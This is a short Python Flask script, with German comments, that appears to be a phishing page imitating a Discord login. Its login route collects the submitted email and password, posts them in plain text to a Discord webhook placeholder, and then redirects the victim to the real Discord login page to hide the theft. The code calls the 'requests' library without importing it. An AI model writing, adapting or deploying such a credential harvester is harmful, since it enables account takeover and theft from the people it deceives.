from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # Hier kannst du deine Discord-Webhook-URL einfügen
    webhook_url = 'My Webhook'

    # Daten für die Webhook-Nachricht zusammenstellen
    data = {
        'content': f'Email: {email}, Password: {password}'
    }

    # An Discord-Webhook senden
    response = requests.post(webhook_url, json=data)

    # Weiterleitung zur Discord-Login-Seite
    return redirect('https://discord.com/login')

if __name__ == '__main__':
    app.run(debug=True)
